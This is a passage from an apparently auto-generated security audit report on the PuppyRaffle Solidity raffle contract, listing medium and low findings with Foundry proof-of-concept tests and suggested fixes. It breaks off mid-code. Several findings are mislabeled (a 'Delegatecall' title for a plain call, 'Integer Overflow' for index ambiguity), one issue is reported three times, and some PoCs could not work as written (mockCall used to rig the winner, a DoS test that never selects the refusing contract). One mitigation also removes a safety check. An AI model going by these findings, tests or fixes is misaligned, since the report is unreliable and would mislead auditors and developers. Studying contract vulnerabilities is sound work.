        assertEq(totalFees, 1e18);
        
        // Start second raffle with 3 new players
        address[] memory newPlayers = new address[](3);
        for (uint256 i = 0; i < 3; i++) {
            newPlayers[i] = address(uint160(i + 100));
        }
        puppyRaffle.enterRaffle{value: entranceFee * 3}(newPlayers);
        
        // Try to withdraw fees - should fail because contract balance > totalFees
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        vm.prank(owner);
        puppyRaffle.withdrawFees();
        
        // Verify fees are still in the contract
        assertEq(puppyRaffle.totalFees(), 1e18);
    }
}

## Suggested Mitigation
Modify the `withdrawFees` function to allow partial withdrawals even when there are active players:

```solidity
function withdrawFees() external {
    uint256 feesToWithdraw = totalFees;
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
    require(address(this).balance >= feesToWithdraw, "PuppyRaffle: Insufficient balance");
    
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

This allows fees to be withdrawn regardless of whether there are active players, as long as the contract has enough balance to cover the fees.

## [M-18]. Zero Code issue in PuppyRaffle::enterRaffle

## Description
The contract allows the address `0` to be entered into the raffle in the `enterRaffle` function. There is no check to prevent the zero address from being registered as a player, which can lead to issues if this address is selected as a winner.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // There is no validation to prevent address(0) in newPlayers array
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }
    // ... rest of the function
}
```

## Impact
If the zero address (address(0)) is included in the players array and gets selected as the winner, funds would be sent to the zero address and effectively burned. Additionally, if an NFT is minted to the zero address, it becomes inaccessible forever. This could lead to loss of value for the protocol and potentially enable griefing attacks.

## Proof of Concept
1. An attacker includes address(0) in their list of players when calling enterRaffle()
2. If address(0) is selected as the winner, the prize money (80% of the pool) would be sent to address(0) and permanently lost
3. Furthermore, the NFT would be minted to address(0) and also permanently lost

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroAddressTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = address(1);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            owner,
            duration
        );
    }

    function testZeroAddressEntry() public {
        // Create an array with the zero address
        address[] memory playersWithZero = new address[](4);
        playersWithZero[0] = address(10);
        playersWithZero[1] = address(20);
        playersWithZero[2] = address(0); // zero address
        playersWithZero[3] = address(30);
        
        // Successfully enter the raffle with a zero address
        puppyRaffle.enterRaffle{value: entranceFee * 4}(playersWithZero);
        
        // Verify the zero address is in the players array
        bool foundZeroAddress = false;
        for (uint256 i = 0; i < 4; i++) {
            try puppyRaffle.getActivePlayerIndex(address(0)) returns (uint256 index) {
                foundZeroAddress = true;
                console.log("Zero address found at index:", index);
                break;
            } catch {
                // Not found
            }
        }
        
        assertTrue(foundZeroAddress, "Zero address should be accepted as a player");
        
        // Simulate time passing to end the raffle
        vm.warp(block.timestamp + duration + 1);
        
        // Record the contract balance before selecting a winner
        uint256 contractBalanceBefore = address(puppyRaffle).balance;
        
        // Forcibly select the zero address as winner using mocked randomness
        // This is simplified - in a real attack, the attacker would hope for this outcome
        uint256 zeroAddressIndex = puppyRaffle.getActivePlayerIndex(address(0));
        vm.mockCall(
            address(puppyRaffle),
            abi.encodeWithSelector(puppyRaffle.selectWinner.selector),
            abi.encode(zeroAddressIndex)
        );
        
        // Select winner (if zero address is chosen, funds are lost)
        puppyRaffle.selectWinner();
        
        // Check if address(0) is now the previous winner
        assertEq(puppyRaffle.previousWinner(), address(0), "Zero address should be able to win");
    }
}

## Suggested Mitigation
Add validation in the `enterRaffle` function to prevent the zero address from being registered as a player:

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(
        msg.value == entranceFee * newPlayers.length,
        "PuppyRaffle: Must send enough to enter raffle"
    );
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        // Add this check
        require(newPlayers[i] != address(0), "PuppyRaffle: Zero address cannot enter raffle");
        
        players.push(newPlayers[i]);
    }
    
    // Rest of the function remains unchanged
    // Check for duplicates...
    
    emit RaffleEnter(newPlayers);
}
```

## [M-19]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function in the PuppyRaffle contract is vulnerable to a block timestamp manipulation attack. The function requires that `block.timestamp >= raffleStartTime + raffleDuration` to select a winner, but miners/validators can manipulate the timestamp within certain bounds.

```solidity
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    // ... winner selection logic
}

## Impact
Miners or validators can manipulate the block timestamp within a small window (typically around 15 seconds). This could allow them to trigger the raffle conclusion slightly earlier or later than intended, potentially providing an advantage in determining when the winner is selected. While this may not directly let them control who wins, it adds another layer of potential manipulation when combined with the weak randomness source.

## Proof of Concept
1. A miner/validator wants to influence the raffle outcome
2. They observe that the raffle is close to ending (within their timestamp manipulation window)
3. They can choose to include transactions that call `selectWinner()` slightly before the actual end time
4. Alternatively, they could delay the timestamp to postpone the raffle conclusion if the current conditions are unfavorable
5. This manipulation window, combined with the weak randomness source, increases their chances of influencing the raffle outcome

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract TimestampManipulationTest is Test {
    PuppyRaffle puppyRaffle;
    address[] public players;
    address public attacker = address(0x1337);
    uint256 public constant RAFFLE_DURATION = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            1 ether,
            address(this),
            RAFFLE_DURATION
        );
        
        // Set up 4 players for the raffle
        players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }
        vm.deal(address(this), 4 ether);
        puppyRaffle.enterRaffle{value: 4 ether}(players);
    }
    
    function testTimestampManipulation() public {
        // Fast forward to just before the raffle ends
        vm.warp(block.timestamp + RAFFLE_DURATION - 15); // 15 seconds before end
        
        // This should fail because raffle is not over yet
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
        
        // Simulate a miner manipulating the timestamp by adding 16 seconds
        // (slightly more than our 15 second buffer)
        vm.warp(block.timestamp + 16);
        
        // Now the call should succeed because the miner advanced the timestamp
        puppyRaffle.selectWinner();
        
        console.log("Raffle ended early due to timestamp manipulation");
        console.log("Expected end time:", block.timestamp + RAFFLE_DURATION - 1);
        console.log("Actual end time:", block.timestamp);
    }
    
    function testTimestampAndRandomnessManipulation() public {
        // Add attacker to the players
        address[] memory attackerArray = new address[](1);
        attackerArray[0] = attacker;
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        puppyRaffle.enterRaffle{value: 1 ether}(attackerArray);
        
        // Fast forward to just before the raffle ends
        vm.warp(block.timestamp + RAFFLE_DURATION - 15);
        
        // Miner tries different timestamps to find one that makes attacker win
        bool foundWinningTimestamp = false;
        uint256 winningTimestamp = 0;
        
        // Try timestamps within the manipulation window
        for (uint256 i = 0; i < 30; i++) { // Try 30 different timestamps
            uint256 testTimestamp = block.timestamp + i;
            uint256 difficulty = 100; // Some fixed difficulty for simplicity
            
            // Calculate winner using the contract's algorithm
            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(attacker, testTimestamp, difficulty))) % 5; // 5 players total
            
            // Check if attacker would win
            if (winnerIndex == 4) { // Attacker is the last player
                foundWinningTimestamp = true;
                winningTimestamp = testTimestamp;
                break;
            }
        }
        
        if (foundWinningTimestamp) {
            // Set the winning timestamp and select winner
            vm.warp(winningTimestamp);
            vm.difficulty(100);
            vm.prank(attacker);
            puppyRaffle.selectWinner();
            
            assertEq(puppyRaffle.previousWinner(), attacker, "Attacker should have won");
            console.log("Attacker won by manipulating timestamp to:", winningTimestamp);
        } else {
            console.log("Could not find a winning timestamp in this test run");
        }
    }
}

## Suggested Mitigation
While timestamp manipulation alone may not be critical, it compounds the randomness issue. To mitigate both issues:

1. Use an oracle like Chainlink VRF for true randomness (as mentioned in the randomness vulnerability fix)
2. For the timestamp dependence, consider using block numbers instead of timestamps for measuring duration, or implement a commit-reveal scheme for winner selection

```solidity
// Option 1: Use block numbers instead of timestamps
contract PuppyRaffle is ERC721, Ownable {
    // Change timestamp to block number
    uint256 public raffleStartBlock;
    uint256 public raffleDurationInBlocks; // ~13.14 seconds per block on Ethereum
    
    constructor(
        uint256 _entranceFee,
        address _feeAddress,
        uint256 _raffleDurationInBlocks
    ) ERC721("Puppy Raffle", "PR") {
        entranceFee = _entranceFee;
        feeAddress = _feeAddress;
        raffleDurationInBlocks = _raffleDurationInBlocks;
        raffleStartBlock = block.number;
        // ... rest of constructor
    }
    
    function selectWinner() external {
        require(block.number >= raffleStartBlock + raffleDurationInBlocks, "PuppyRaffle: Raffle not over");
        // ... rest of function
        raffleStartBlock = block.number; // Reset for next raffle
    }
}

// Option 2: Use a commit-reveal scheme with Chainlink VRF
// This is a more comprehensive fix that addresses both timestamp and randomness issues
// See the Chainlink VRF implementation in the randomness vulnerability mitigation
```

## [M-20]. Array Limits issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function does not properly validate the input array, which could lead to duplicate player addresses being added. While the function does check for duplicates, it only compares players that are already in the array after adding the new players. This means a malicious user could pass an array with duplicate addresses to the function.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // ... other code
    
    // Add new players
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }
    
    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    // ... other code
}

## Impact
If a malicious user enters the same address multiple times in a single `enterRaffle` call, the require statement will revert the transaction, but only after consuming significant gas due to the nested loop check. This can be exploited to create a denial-of-service attack where an attacker intentionally provides duplicate addresses to force other users to waste gas. Additionally, the function might be used to spam the contract with invalid transactions, degrading the user experience.

## Proof of Concept
1. A malicious user calls `enterRaffle` with an array containing duplicate addresses
2. The function adds all addresses to the `players` array
3. When checking for duplicates in the nested loop, the transaction will revert
4. Gas is wasted processing the nested loop before the revert occurs
5. This process can be repeated to cause frustration and waste gas for users

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract EnterRaffleDuplicateInputTest is Test {
    PuppyRaffle puppyRaffle;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            1 ether,
            address(this),
            1 days
        );
    }
    
    function testEnterRaffleDuplicateInput() public {
        // Create an array with duplicate addresses
        address[] memory duplicatePlayers = new address[](3);
        duplicatePlayers[0] = address(1);
        duplicatePlayers[1] = address(2);
        duplicatePlayers[2] = address(1); // Duplicate of the first address
        
        // Should revert, but only after gas is consumed
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: 3 ether}(duplicatePlayers);
        
        // Demonstrate how this wastes gas
        uint256 gasStart = gasleft();
        try puppyRaffle.enterRaffle{value: 3 ether}(duplicatePlayers) {
            // This will not execute due to the revert
        } catch {
            uint256 gasUsed = gasStart - gasleft();
            console.log("Gas wasted on failed transaction:", gasUsed);
        }
        
        // Show a successful transaction for comparison
        address[] memory validPlayers = new address[](3);
        validPlayers[0] = address(1);
        validPlayers[1] = address(2);
        validPlayers[2] = address(3);
        
        gasStart = gasleft();
        puppyRaffle.enterRaffle{value: 3 ether}(validPlayers);
        uint256 gasUsedValid = gasStart - gasleft();
        
        console.log("Gas used for valid transaction:", gasUsedValid);
    }
}

## Suggested Mitigation
Validate the input array for duplicates before adding players to the main array. This prevents gas wastage from adding players and then reverting.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    // Check for duplicates in the input array first
    for (uint256 i = 0; i < newPlayers.length - 1; i++) {
        for (uint256 j = i + 1; j < newPlayers.length; j++) {
            require(newPlayers[i] != newPlayers[j], "PuppyRaffle: Duplicate player in input");
        }
    }
    
    // Check for duplicates against existing players
    for (uint256 i = 0; i < newPlayers.length; i++) {
        for (uint256 j = 0; j < players.length; j++) {
            require(newPlayers[i] != players[j], "PuppyRaffle: Player already in the raffle");
        }
    }
    
    // Add new players
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }
    
    emit RaffleEnter(newPlayers);
}
```

For a more gas-efficient approach, use a mapping as suggested in the GasGriefBlockLimit vulnerability fix.

## [M-21]. Delegatecall Low Level Ops issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses a direct low-level call to send the prize pool to the winner without properly checking for contract receivers:

```solidity
function selectWinner() external {
    // ... other code ...
    
    // Transfer prize to winner
    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    
    // ... other code ...
}
```

While the function does check if the call was successful, it doesn't handle the case where the winner is a contract that doesn't have a receive/fallback function or intentionally reverts.

## Impact
If the winner is a smart contract that cannot receive ETH (has no receive/fallback function) or a malicious contract that deliberately reverts when receiving ETH, the selectWinner function will fail. This could permanently stall the raffle if the chosen winner cannot accept the prize, preventing the contract from moving on to the next raffle.

## Proof of Concept
1. A smart contract enters the raffle
2. This contract has no receive/fallback function or intentionally reverts when receiving ETH
3. If this contract is chosen as the winner, the low-level call to transfer the prize will fail
4. The selectWinner function will revert due to the require(success) check
5. The raffle is now stuck - it cannot complete because it cannot transfer the prize
6. This effectively creates a permanent denial of service condition for the raffle

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// Malicious contract that refuses to accept ETH
contract ETHRefuser {
    // No receive or fallback function
    
    // Function to enter the raffle
    function enterRaffle(PuppyRaffle raffle, uint256 entranceFee) external {
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(players);
    }
}

contract LowLevelCallTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address owner = address(1);
    uint256 duration = 1 days;
    ETHRefuser ethRefuser;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            owner,
            duration
        );
        ethRefuser = new ETHRefuser();
    }
    
    function testDoSWithETHRefuser() public {
        // First, have the ETH refuser enter the raffle
        vm.deal(address(ethRefuser), entranceFee);
        ethRefuser.enterRaffle(puppyRaffle, entranceFee);
        
        // Add more players to ensure we reach the minimum
        address[] memory players = new address[](3);
        players[0] = address(10);
        players[1] = address(20);
        players[2] = address(30);
        
        vm.deal(address(this), entranceFee * 3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
        
        // Fast forward time to end the raffle
        vm.warp(block.timestamp + duration + 1);
        
        // Rig the random selection to make ethRefuser the winner
        // We'll need to manipulate the block.timestamp and block.difficulty
        // This is simplified - in a real attack we'd need to try different values
        
        // For testing purposes, we'll just expect the call to revert
        // when the ETH refuser is selected as winner
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
        
        // The raffle is now stuck - we can't complete it
        // Let's verify that by checking if the players array is still populated
        assertTrue(puppyRaffle.getPlayersLength() > 0, "Players array should still be populated");
        
        console.log("The raffle is now permanently stuck because the winner cannot accept ETH");
    }
}

## Suggested Mitigation
Implement a pull pattern for prize distribution instead of pushing funds to winners:

```solidity
// Add a mapping to track unclaimed prizes
mapping(address => uint256) public prizesToClaim;

function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    // Select winner as before
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    
    // Calculate prize pool
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    
    // Instead of sending prize directly, store it for claiming
    prizesToClaim[winner] += prizePool;
    
    // Mint NFT and reset raffle state as before
    uint256 tokenId = totalSupply();
    // ... determine rarity logic ...
    
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    
    // Mint the NFT
    _safeMint(winner, tokenId);
    
    // Emit an event about the winner and available prize
    emit RaffleWinner(winner, tokenId, prizePool);
}

// Add a function for winners to claim their prizes
function claimPrize() external {
    uint256 prize = prizesToClaim[msg.sender];
    require(prize > 0, "PuppyRaffle: No prize to claim");
    
    // Reset prize amount before sending
    prizesToClaim[msg.sender] = 0;
    
    // Send the prize
    (bool success, ) = msg.sender.call{value: prize}("");
    require(success, "PuppyRaffle: Failed to claim prize");
    
    emit PrizeClaimed(msg.sender, prize);
}
```



# Low Risk Findings

## [L-1]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses a floating pragma `^0.7.6` which allows compilation with different compiler versions. This can lead to unexpected behavior and potential security vulnerabilities if compiled with a newer version that has breaking changes or undiscovered bugs. The vulnerable code is: `pragma solidity ^0.7.6;`

## Impact
Different compiler versions may introduce unexpected behavior, security vulnerabilities, or breaking changes that could compromise contract functionality and security.

## Proof of Concept
1. Contract is deployed with pragma ^0.7.6 2. Later compilation with a different 0.7.x version introduces subtle bugs 3. Contract behavior changes unexpectedly 4. Security vulnerabilities may be introduced

## Proof of Code
// No test needed - this is a compilation issue
// The pragma allows any 0.7.x version >= 0.7.6

## Suggested Mitigation
Use a fixed pragma version: `pragma solidity 0.7.6;` instead of `pragma solidity ^0.7.6;`

## [L-2]. Event Consistency issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function returns 0 for both non-existent players and players at index 0, creating ambiguity. This can lead to incorrect logic when determining if a player is active. The vulnerable code is: `function getActivePlayerIndex(address player) external view returns (uint256) { for (uint256 i = 0; i < players.length; i++) { if (players[i] == player) { return i; } } return 0; }`

## Impact
Incorrect player status determination can lead to logic errors in external contracts or frontends that rely on this function to determine if a player is active.

## Proof of Concept
1. Player at index 0 enters the raffle 2. External contract calls getActivePlayerIndex for this player 3. Function returns 0 4. External contract cannot distinguish between 'player not found' and 'player at index 0' 5. Logic errors occur in external contract

## Proof of Code
function testAmbiguousPlayerIndex() public {
    address player1 = address(1);
    address player2 = address(2);
    address nonPlayer = address(999);
    
    address[] memory players = new address[](2);
    players[0] = player1;
    players[1] = player2;
    
    vm.deal(address(this), 2 ether);
    puppyRaffle.enterRaffle{value: 2 ether}(players);
    
    // Player at index 0 returns 0
    uint256 index1 = puppyRaffle.getActivePlayerIndex(player1);
    assertEq(index1, 0);
    
    // Non-existent player also returns 0
    uint256 indexNonPlayer = puppyRaffle.getActivePlayerIndex(nonPlayer);
    assertEq(indexNonPlayer, 0);
    
    // Cannot distinguish between the two cases
    assertEq(index1, indexNonPlayer); // This creates ambiguity
}

## Suggested Mitigation
Return a value that indicates 'not found' such as `type(uint256).max` or use a different approach: `function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) { for (uint256 i = 0; i < players.length; i++) { if (players[i] == player) { return (true, i); } } return (false, 0); }`

## [L-3]. Default Visibility issue in PuppyRaffle::getActivePlayerIndex

## Description
The getActivePlayerIndex function returns 0 both for the player at index 0 and for players not found. This creates ambiguity where a legitimate player at index 0 appears inactive, and non-existent players appear to be at index 0.

## Impact
Players at index 0 may be incorrectly identified as inactive, and non-existent players may be treated as if they're at index 0. This can lead to confusion in player management and potentially incorrect refund logic.

## Proof of Concept
1. Player A enters raffle and gets index 0. 2. Someone calls getActivePlayerIndex(playerA) and gets 0. 3. Someone calls getActivePlayerIndex(nonExistentPlayer) and also gets 0. 4. Both results are identical despite different meanings. 5. Logic depending on this function may make incorrect decisions.

## Proof of Code
```solidity
function test_GetActivePlayerIndexAmbiguity() public {
    address[] memory players = new address[](1);
    players[0] = address(1);
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    
    // Player at index 0 returns 0
    uint256 index1 = puppyRaffle.getActivePlayerIndex(address(1));
    assertEq(index1, 0);
    
    // Non-existent player also returns 0
    uint256 index2 = puppyRaffle.getActivePlayerIndex(address(999));
    assertEq(index2, 0);
    
    // Both return the same value but have different meanings
    assertEq(index1, index2); // This passes but shouldn't logically
}
```

## Suggested Mitigation
Use a different return value for 'not found' cases, such as returning the array length or using a boolean return. Example: ```solidity
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

## [L-4]. Event Consistency issue in PuppyRaffle::selectWinner

## Description
Critical state changes in the contract are not properly emitted as events. Specifically, the selectWinner function transfers prize money and mints NFTs without emitting corresponding events, and the refund function modifies the players array without adequate event logging.

## Impact
Off-chain applications and monitoring systems cannot properly track important state changes like winner selection, prize distribution, and NFT minting. This reduces transparency and makes it difficult to audit contract behavior.

## Proof of Concept
1. selectWinner function executes successfully. 2. Winner receives prize pool and NFT. 3. No event is emitted for winner selection or prize distribution. 4. Off-chain systems cannot detect these critical changes. 5. Transparency and auditability are compromised.

## Proof of Code
```solidity
function test_MissingWinnerSelectionEvent() public {
    address[] memory players = new address[](4);
    for(uint i = 0; i < 4; i++) {
        players[i] = address(uint160(i + 1));
    }
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    
    vm.warp(block.timestamp + duration + 1);
    
    // Record events before winner selection
    vm.recordLogs();
    puppyRaffle.selectWinner();
    Vm.Log[] memory logs = vm.getRecordedLogs();
    
    // Should have events for winner selection and prize distribution
    // but currently only has Transfer event from ERC721
    bool hasWinnerEvent = false;
    for(uint i = 0; i < logs.length; i++) {
        if(logs[i].topics[0] == keccak256("WinnerSelected(address,uint256)")) {
            hasWinnerEvent = true;
        }
    }
    assertFalse(hasWinnerEvent); // This passes, showing missing event
}
```

## Suggested Mitigation
Add appropriate events for all critical state changes. Example: ```solidity
event WinnerSelected(address indexed winner, uint256 prizePool, uint256 tokenId);
event PrizeDistributed(address indexed winner, uint256 amount);

function selectWinner() external {
    // ... existing logic ...
    
    emit WinnerSelected(winner, prizePool, tokenId);
    emit PrizeDistributed(winner, prizePool);
    
    // ... rest of function ...
}
```

## [L-5]. Integer Overflow/Math issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function returns 0 when a player is not found in the players array. However, 0 is also a valid index, which creates ambiguity in determining if a player is actually participating in the raffle.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

If a player is at index 0, the function returns 0, which is the same value returned when a player is not found.

## Impact
This ambiguity could lead to incorrect logic in external contracts or UIs that rely on this function to determine if a player is active. It could cause situations where a player at index 0 is incorrectly identified as inactive, or an inactive player is incorrectly identified as active at index 0.

## Proof of Concept
1. A player enters the raffle and happens to be placed at index 0 of the players array
2. Another contract or UI calls `getActivePlayerIndex` to check if this player is active
3. The function returns 0, which could be misinterpreted as "player not found" instead of "player is at index 0"
4. This misinterpretation could lead to incorrect business logic and user experience issues

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IndexAmbiguityTest is Test {
    PuppyRaffle raffle;
    address player1 = address(0x1);
    
    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(this), 1 days);
    }
    
    function testIndexAmbiguity() public {
        // Enter player1 into the raffle
        address[] memory players = new address[](1);
        players[0] = player1;
        raffle.enterRaffle{value: 1 ether}(players);
        
        // Check index of player1 - should be 0
        uint256 index = raffle.getActivePlayerIndex(player1);
        assertEq(index, 0, "Player1 should be at index 0");
        
        // Now check a player that hasn't entered
        address nonPlayer = address(0xdead);
        uint256 nonPlayerIndex = raffle.getActivePlayerIndex(nonPlayer);
        assertEq(nonPlayerIndex, 0, "Non-player should return 0, indicating not found");
        
        // This shows the ambiguity - both an active player at index 0 and a non-player return 0
        assertEq(index, nonPlayerIndex, "The indices are the same, causing ambiguity");
        
        // If code assumes return value 0 means "not active", it would incorrectly classify player1
        bool isActiveBasedOnIndex = (index != 0); // Common but incorrect assumption
        assertFalse(isActiveBasedOnIndex, "Player1 incorrectly identified as inactive");
    }
}

## Suggested Mitigation
Modify the `getActivePlayerIndex` function to return a special value that cannot be a valid index (like `type(uint256).max`) when a player is not found, or add an additional boolean return value to explicitly indicate if the player was found:

```solidity
// Option 1: Return type(uint256).max for not found
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Clearly indicates not found
}
```

```solidity
// Option 2: Return both index and found status
function getActivePlayerIndex(address player) external view returns (uint256 index, bool found) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (i, true);
        }
    }
    return (0, false);
}
```

## [L-6]. Timestamp Dependent Logic issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function doesn't check if the raffle duration has ended before allowing new players to enter. This could lead to players entering a raffle that will be immediately ended by someone calling `selectWinner`. The vulnerable code:
```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    // ... other code ...
}
```

## Impact
Players might enter a raffle that's about to end, only to have the winner selected immediately after, before they have a fair chance to participate. This could lead to a poor user experience and potential confusion, especially if a player enters right before someone calls selectWinner.

## Proof of Concept
1. A raffle is running and close to its end time
2. A player enters the raffle by calling enterRaffle
3. Immediately after, someone calls selectWinner
4. The player has effectively participated in a raffle they had no real chance of winning

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract LastMinuteEntryTest is Test {
    PuppyRaffle puppyRaffle;
    address player = makeAddr("player");
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            1 ether,                 // entrance fee
            address(this),           // fee address
            1 days                   // raffle duration
        );
        
        // Setup 3 existing players
        address[] memory initialPlayers = new address[](3);
        initialPlayers[0] = makeAddr("player1");
        initialPlayers[1] = makeAddr("player2");
        initialPlayers[2] = makeAddr("player3");
        
        vm.deal(address(this), 3 ether);
        puppyRaffle.enterRaffle{value: 3 ether}(initialPlayers);
    }
    
    function testLastMinuteEntry() public {
        // Fast forward to just before the raffle ends
        vm.warp(block.timestamp + 1 days - 1 minutes);
        
        // New player enters at the last minute
        address[] memory newPlayers = new address[](1);
        newPlayers[0] = player;
        
        vm.deal(player, 1 ether);
        vm.prank(player);
        puppyRaffle.enterRaffle{value: 1 ether}(newPlayers);
        
        // Raffle can be ended immediately after
        vm.warp(block.timestamp + 1 minutes);
        puppyRaffle.selectWinner();
        
        // Player entered but had virtually no chance to win due to timing
        // This isn't fair to the player, who might feel misled
    }
}

## Suggested Mitigation
Add a check to prevent players from entering a raffle that's about to end:

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    // Add check to prevent last-minute entries
    require(
        block.timestamp < raffleStartTime + raffleDuration - 1 hours, 
        "PuppyRaffle: Raffle about to end, cannot enter"
    );
    
    // ... rest of the function ...
}
```

Alternatively, you could implement a minimum participation time and reset the raffle duration when new players enter:

```solidity
// Add a minimum participation time
uint256 public constant MINIMUM_PARTICIPATION_TIME = 6 hours;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    // If the raffle would end sooner than the minimum participation time,
    // extend the raffle duration
    uint256 timeRemaining = (raffleStartTime + raffleDuration) - block.timestamp;
    if (timeRemaining < MINIMUM_PARTICIPATION_TIME) {
        raffleStartTime = block.timestamp;
        // Emit an event for the raffle extension
    }
    
    // ... rest of the function ...
}
```

## [L-7]. Unchecked Return issue in PuppyRaffle::selectWinner

## Description
The contract doesn't check the return value of `_safeMint` in the `selectWinner` function. While OpenZeppelin's ERC721 implementation does revert on failure, it's best practice to explicitly check return values or use a version that reverts on failure. The vulnerable code:
```solidity
function selectWinner() external {
    // ... other code ...
    _safeMint(winner, tokenId);
}
```

## Impact
While the impact is minimal with the current implementation of OpenZeppelin's ERC721, it represents a code quality issue and a potential source of future bugs if the underlying implementation changes or if the contract is modified to use a different ERC721 implementation that might not revert on failure.

## Proof of Concept
1. The contract calls _safeMint without checking the return value
2. While the current implementation of OpenZeppelin's ERC721 would revert on failure, this is not guaranteed for all implementations
3. This could lead to silent failures if the contract is modified to use a different ERC721 implementation

## Proof of Code
// No proof of code is necessary as this is a code quality issue rather than an exploitable vulnerability with the current implementation

## Suggested Mitigation
While the current implementation of _safeMint in OpenZeppelin's ERC721 reverts on failure, it's best practice to use a try/catch or explicitly handle any potential failure modes. In Solidity 0.8.x, you could use a try/catch block, but in 0.7.x, this approach isn't necessary because _safeMint will revert on failure.

However, to improve code quality and future-proof the contract, you can add a comment explaining the expected behavior:

```solidity
function selectWinner() external {
    // ... existing code ...
    
    // _safeMint will revert on failure, so no need for additional checks
    _safeMint(winner, tokenId);
}
```

When upgrading to Solidity 0.8.x in the future, you could enhance this with a try/catch block:

```solidity
// In Solidity 0.8.x:
try this._safeMint(winner, tokenId) {
    // Minting succeeded
} catch Error(string memory reason) {
    // Handle failure - revert with reason
